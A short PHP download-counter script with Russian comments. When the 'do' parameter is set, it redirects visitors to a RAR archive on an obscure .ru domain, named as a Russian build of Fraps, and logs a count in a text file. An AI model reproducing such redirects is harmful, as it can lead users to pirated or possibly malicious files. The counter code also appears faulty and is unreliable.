<?php
if (isset($_GET['do']))
{

header("location: https://ofeligtelemsbasda2.ru/kim/fraps.3.5.99.rus.rar"); //Это файл, который нужно скачать
$file=fopen("1.txt","a+"); //Открытие
flock($file,LOCK_EX); //Блокировка
$count=fread($file,100); //Чтение
$count++; // Увеличение значение на 1
ftruncate($file,0); // Очищаем файл
fwrite($file,$count); //Записываем новое значение
flock($file,LOCK_UN); //Разблокируем
fclose($file); //Закрываем

}
?>